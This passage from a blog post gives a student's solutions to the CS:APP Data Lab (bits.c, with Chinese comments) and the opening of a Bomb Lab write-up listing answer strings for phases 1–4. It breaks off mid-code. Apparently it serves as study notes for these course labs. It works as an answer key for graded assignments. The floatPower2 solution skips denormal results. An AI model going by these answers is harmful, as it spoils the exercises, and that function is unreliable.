bits.c - Source file with your solutions to the Lab.</span></span><br><span class="line"><span class="comment"> *          This is the file you will hand in to your instructor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Do not include the &lt;stdio.h&gt; header; it confuses the dlc</span></span><br><span class="line"><span class="comment"> * compiler. You can still use printf for debugging without including</span></span><br><span class="line"><span class="comment"> * &lt;stdio.h&gt;, although you might get a compiler warning. In general,</span></span><br><span class="line"><span class="comment"> * it's not good practice to ignore compiler warnings, but in this</span></span><br><span class="line"><span class="comment"> * case it's OK.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Instructions to Students:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * STEP 1: Read the following instructions carefully.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">You will provide your solution to the Data Lab by</span><br><span class="line">editing the collection of functions in this source file.</span><br><span class="line"></span><br><span class="line">INTEGER CODING RULES:</span><br><span class="line"> </span><br><span class="line">  Replace the <span class="string">"return"</span> statement in each function with one</span><br><span class="line">  or more lines of C code that implements the function. Your code </span><br><span class="line">  must conform to the following style:</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> <span class="title function_">Funct</span><span class="params">(arg1, arg2, ...)</span> {</span><br><span class="line">      <span class="comment">/* brief description of how your implementation works */</span></span><br><span class="line">      <span class="type">int</span> var1 = Expr1;</span><br><span class="line">      ...</span><br><span class="line">      <span class="type">int</span> varM = ExprM;</span><br><span class="line"></span><br><span class="line">      varJ = ExprJ;</span><br><span class="line">      ...</span><br><span class="line">      varN = ExprN;</span><br><span class="line">      <span class="keyword">return</span> ExprR;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  Each <span class="string">"Expr"</span> is an expression using ONLY the following:</span><br><span class="line">  <span class="number">1.</span> Integer constants <span class="number">0</span> through <span class="number">255</span> (<span class="number">0xFF</span>), inclusive. You are</span><br><span class="line">      not allowed to use big constants such as <span class="number">0xffffffff</span>.</span><br><span class="line">  <span class="number">2.</span> Function arguments and local <span class="title function_">variables</span> <span class="params">(no global variables)</span>.</span><br><span class="line">  3. Unary integer operations ! ~</span><br><span class="line">  4. Binary integer operations &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line">    </span><br><span class="line">  Some of the problems <span class="keyword">restrict</span> the <span class="built_in">set</span> of allowed operators even further.</span><br><span class="line">  Each "Expr" may consist of multiple operators. You are not restricted to</span><br><span class="line">  one operator per line.</span><br><span class="line"></span><br><span class="line">  You are expressly forbidden to:</span><br><span class="line">  1. Use any control constructs such as <span class="keyword">if</span>, <span class="keyword">do</span>, <span class="keyword">while</span>, <span class="keyword">for</span>, <span class="keyword">switch</span>, etc.</span><br><span class="line">  2. Define or use any macros.</span><br><span class="line">  3. Define any additional functions in this file.</span><br><span class="line">  4. Call any functions.</span><br><span class="line">  5. Use any other operations, such as &amp;&amp;, ||, -, or ?:</span><br><span class="line">  6. Use any form of casting.</span><br><span class="line">  7. Use any data type other than <span class="type">int</span>.  This implies that you</span><br><span class="line">     cannot use arrays, structs, or unions.</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  You may assume that your machine:</span><br><span class="line">  1. Uses 2s complement, 32-bit representations of integers.</span><br><span class="line">  2. Performs right shifts arithmetically.</span><br><span class="line">  3. Has unpredictable behavior when shifting <span class="keyword">if</span> the shift amount</span><br><span class="line">     is less than 0 or greater than 31.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXAMPLES OF ACCEPTABLE CODING STYLE:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * pow2plus1 - returns 2^x + 1, where 0 &lt;= x &lt;= 31</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> <span class="title function_">pow2plus1</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">     <span class="comment">/* exploit ability of shifts to compute powers of 2 */</span></span><br><span class="line">     <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; x) + <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * pow2plus4 - returns 2^x + 4, where 0 &lt;= x &lt;= 31</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> <span class="title function_">pow2plus4</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">     <span class="comment">/* exploit ability of shifts to compute powers of 2 */</span></span><br><span class="line">     <span class="type">int</span> result = (<span class="number">1</span> &lt;&lt; x);</span><br><span class="line">     result += <span class="number">4</span>;</span><br><span class="line">     <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">FLOATING POINT CODING RULES</span><br><span class="line"></span><br><span class="line">For the problems that require you to implement floating-point operations,</span><br><span class="line">the coding rules are less strict.  You are allowed to use looping and</span><br><span class="line">conditional control.  You are allowed to use both ints and unsigneds.</span><br><span class="line">You can use arbitrary integer and <span class="type">unsigned</span> constants. You can use any arithmetic,</span><br><span class="line">logical, or comparison operations on <span class="type">int</span> or <span class="type">unsigned</span> data.</span><br><span class="line"></span><br><span class="line">You are expressly forbidden to:</span><br><span class="line">  <span class="number">1.</span> Define or use any macros.</span><br><span class="line">  <span class="number">2.</span> Define any additional functions in this file.</span><br><span class="line">  <span class="number">3.</span> Call any functions.</span><br><span class="line">  <span class="number">4.</span> Use any form of casting.</span><br><span class="line">  <span class="number">5.</span> Use any data type other than <span class="type">int</span> or <span class="type">unsigned</span>.  This means that you</span><br><span class="line">     cannot use arrays, structs, or unions.</span><br><span class="line">  <span class="number">6.</span> Use any floating point data types, operations, or constants.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTES:</span><br><span class="line">  <span class="number">1.</span> Use the <span class="title function_">dlc</span> <span class="params">(data lab checker)</span> <span class="title function_">compiler</span> <span class="params">(described in the handout)</span> to </span><br><span class="line">     check the legality of your solutions.</span><br><span class="line">  2. Each function has a maximum number of <span class="title function_">operations</span> <span class="params">(integer, logical,</span></span><br><span class="line"><span class="params">     or comparison)</span> that you are allowed to use <span class="keyword">for</span> your implementation</span><br><span class="line">     of the function.  The max operator count is checked by dlc.</span><br><span class="line">     Note that <span class="title function_">assignment</span> <span class="params">(<span class="string">'='</span>)</span> is not counted; you may use as many of</span><br><span class="line">     these as you want without penalty.</span><br><span class="line">  <span class="number">3.</span> Use the btest test harness to check your functions <span class="keyword">for</span> correctness.</span><br><span class="line">  <span class="number">4.</span> Use the BDD checker to formally verify your functions</span><br><span class="line">  <span class="number">5.</span> The maximum number of ops <span class="keyword">for</span> each function is given in the</span><br><span class="line">     header comment <span class="keyword">for</span> each function. If there are any inconsistencies </span><br><span class="line">     between the maximum ops in the writeup and in this file, consider</span><br><span class="line">     this file the authoritative source.</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * STEP 2: Modify the following functions according the coding rules.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   IMPORTANT. TO AVOID GRADING SURPRISES:</span></span><br><span class="line"><span class="comment"> *   1. Use the dlc compiler to check that your solutions conform</span></span><br><span class="line"><span class="comment"> *      to the coding rules.</span></span><br><span class="line"><span class="comment"> *   2. Use the BDD checker to formally verify that your solutions produce </span></span><br><span class="line"><span class="comment"> *      the correct answers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> {</span><br><span class="line">  <span class="comment">//数字逻辑异或的与非转换</span></span><br><span class="line">  <span class="keyword">return</span> ~((~((~x)&amp;y))&amp;(~(x&amp;(~y))));</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two's complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line">   <span class="comment">//最小的数是仅有最高有效位为1的数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="comment">//2</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two's complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//返回真值,关键在于将满足条件的数(即最大数)唯一地处理成0</span></span><br><span class="line">  <span class="comment">//利用xor比较是否相等</span></span><br><span class="line">  <span class="comment">//最大数+1和取反相同:!((~x)^(x+1));  但是-1同样有这一性质,要扣掉</span></span><br><span class="line">  <span class="comment">//利用!将数值转换为布尔值,再结合&amp;实现&amp;&amp;的功能</span></span><br><span class="line">  <span class="comment">//如果有移位操作:!((~x)^(1&lt;&lt;31))</span></span><br><span class="line">  <span class="type">int</span> x_plus_1 = x + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> (!((~x) ^ (x_plus_1)))&amp;(!!(x_plus_1));</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//类似掩码吧</span></span><br><span class="line">  <span class="type">int</span> all = <span class="number">0xAA</span>+(<span class="number">0xAA</span>&lt;&lt;<span class="number">8</span>)+(<span class="number">0xAA</span>&lt;&lt;<span class="number">16</span>)+(<span class="number">0xAA</span>&lt;&lt;<span class="number">24</span>);</span><br><span class="line">  <span class="keyword">return</span> !((x&amp;all)^all);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//负数补码:绝对值取反+1</span></span><br><span class="line">  <span class="comment">//反过来正数求相反数:-1再取反</span></span><br><span class="line">  <span class="comment">//不过~(x-1)==(~x)+1</span></span><br><span class="line">  <span class="keyword">return</span> (~x)+<span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//3</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9')</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//该范围的有效位位:110000-111001</span></span><br><span class="line">  <span class="comment">//前两位及更高位固定不变,单独异或验证</span></span><br><span class="line">  <span class="comment">//末4位采用4位溢出的方式验证</span></span><br><span class="line">  <span class="type">int</span> bool1 = (x&gt;&gt;<span class="number">4</span>)^<span class="number">3</span>;</span><br><span class="line">  <span class="type">int</span> last_byte = x&amp;<span class="number">15</span>;</span><br><span class="line">  <span class="type">int</span> bool2 = (last_byte+<span class="number">6</span>)&amp;<span class="number">16</span>;</span><br><span class="line">  <span class="keyword">return</span> !bool1&amp;!bool2;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> {</span><br><span class="line">  <span class="comment">//将x转换成0和-1,与x,y进行&amp;.(1会清空高位,选用-1保留所有位)</span></span><br><span class="line">  <span class="comment">//从flag1-&gt;flag2: 0异或任何数等于任何数,-1异或-1为0.实现0和-1的转化</span></span><br><span class="line">    <span class="type">int</span> flag1 = (~!!x) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> flag2 = flag1 ^ (~<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> (flag1 &amp; y) | (flag2 &amp; z);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> {</span><br><span class="line">  <span class="comment">//若不考虑溢出,则检测x-y的符号位</span></span><br><span class="line">  <span class="comment">//考虑溢出,因为溢出仅在x负y正和x正y负的情况下出现,而这两种情况又可直接比较大小,单独设置flag判断</span></span><br><span class="line">  <span class="type">int</span> mask = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> var1 = !(x&amp;mask);</span><br><span class="line">  <span class="type">int</span> var2 = !(y&amp;mask);</span><br><span class="line">  <span class="type">int</span> flag1 = !var1&amp;var2;</span><br><span class="line">  <span class="type">int</span> flag2 = !var2&amp;var1;</span><br><span class="line">  <span class="type">int</span> x_sub_y = x+(~y)+<span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> negate_SF = !((mask)&amp;x_sub_y);</span><br><span class="line">  <span class="comment">//感觉应该能化简..</span></span><br><span class="line">  <span class="keyword">return</span> (!negate_SF|!x_sub_y|flag1)&amp;!flag2;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="comment">//4</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">// (-x|x),若不为零,该值符号位必为1.</span></span><br><span class="line">    <span class="keyword">return</span> (~((((~x)+<span class="number">1</span>)|x)&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>)^<span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two's complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">  <span class="comment">//二分法,若为负找最高0,若为正找最高1</span></span><br><span class="line">    <span class="type">int</span> flag, cnt_16, cnt_8, cnt_4, cnt_2, cnt_1, cnt_0;</span><br><span class="line">    <span class="type">int</span> sign = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    x = (sign &amp; (~x)) | (~sign &amp; (x));</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    cnt_16 = flag &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    x &gt;&gt;= (cnt_16);</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cnt_8 = flag &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    x &gt;&gt;= (cnt_8);</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    cnt_4 = flag &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    x &gt;&gt;= cnt_4;</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    cnt_2 = flag &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    x &gt;&gt;= cnt_2;</span><br><span class="line">    flag = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    cnt_1 = flag;</span><br><span class="line">    x &gt;&gt;= cnt_1;</span><br><span class="line">    cnt_0 = x;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + cnt_0 + cnt_1 + cnt_2 + cnt_4 + cnt_8 + cnt_16;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> </span><br><span class="line">{</span><br><span class="line">  <span class="comment">//分别处理三部分,*2就是exp+1;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="built_in">exp</span> = (uf &lt;&lt; <span class="number">1</span> &gt;&gt; <span class="number">24</span>);</span><br><span class="line">    <span class="type">unsigned</span> frac = uf &lt;&lt; <span class="number">9</span> &gt;&gt; <span class="number">9</span>;</span><br><span class="line">    <span class="type">int</span> mask = uf &gt;&gt; <span class="number">31</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">255</span> &amp;&amp; frac)</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &gt;= <span class="number">254</span>)</span><br><span class="line">        <span class="keyword">return</span> mask| <span class="number">0x7f800000</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> mask | uf &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">exp</span>++;</span><br><span class="line">    <span class="keyword">return</span> mask|(<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>)|frac;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> {</span><br><span class="line">    <span class="type">int</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="type">int</span> sign = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> frac = uf &amp; <span class="number">0x7fffff</span>;</span><br><span class="line">    <span class="type">int</span> shiftBits = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 0比较特殊，先判断0(正负0都算作0)</span></span><br><span class="line">    <span class="keyword">if</span> (!(uf &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 判断是否为NaN还是无穷大</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">    <span class="comment">// 指数减去偏移量，获取到真正的指数</span></span><br><span class="line">    <span class="built_in">exp</span> -= <span class="number">127</span>;</span><br><span class="line">    <span class="comment">// 需要注意的是，原来的frac一旦向左移位，其值就一定会小于1，所以返回0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 获取M，注意exp等于-127和不等于-127的情况是不一样的。当exp != -127时还有一个隐藏的1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> != <span class="number">-127</span>)</span><br><span class="line">        frac |= (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);</span><br><span class="line">    <span class="comment">// 要移位的位数。注意float的小数点是点在第23位与第22位之间</span></span><br><span class="line">    shiftBits = <span class="number">23</span> - <span class="built_in">exp</span>;</span><br><span class="line">    <span class="comment">// 需要注意一点，如果指数过大，则也返回0x80000000u</span></span><br><span class="line">    <span class="keyword">if</span> (shiftBits &lt; <span class="number">31</span> - <span class="number">23</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">    <span class="comment">// 获取真正的结果</span></span><br><span class="line">    frac &gt;&gt;= shiftBits;</span><br><span class="line">    <span class="comment">// 判断符号</span></span><br><span class="line">    <span class="keyword">if</span> (sign == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> ~frac + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> frac;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">    <span class="comment">// 判断指数是否上溢或者下溢</span></span><br><span class="line">    <span class="type">int</span> <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &gt; <span class="number">0xfe</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x7f800000</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">exp</span> &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305111056381.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305111057616.png"></p><h1 id="Lab2-Bomb-Lab"><a href="#Lab2-Bomb-Lab" class="headerlink" title="Lab2:Bomb Lab"></a>Lab2:Bomb Lab</h1><p>拆炸弹,实际上就是逆向找绕过条件.<br>用IDA感觉直接秒了,不过练一下看汇编吧.<br>之前还真没有嗯看过汇编.<br>先根据跳转的地址将代码分成几个部分,从外向内识别每个循环体.</p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>一个简单的字符串比较<br>payload:’Border relations with Canada have never been better.’</p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>读入六个数字,第一个为1,下一个为上一个的两倍<br>payload:’1 2 4 8 16 32’</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>读入两个数字,第一个数字不大于7.<br>实现了一张跳转表,跳到跳转表的第一个条目,检查第二个数字是否是311.<br>payload:’1 311’<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305111501156.png"></p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p>主要逆这个函数了,可见var2==arg1的时候拆除炸弹.<br>payload:’7 0’</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">func4(arg1,arg2,arg3)</span><br><span class="line">{</span><br><span class="line">    var1 = arg3-arg2;</span><br><span class="line">    var2 = arg2&gt;&gt;<span class="number">31</span>;</span><br><span class="line">    var1 += var2;</span><br><span class="line">    var1 /= <span 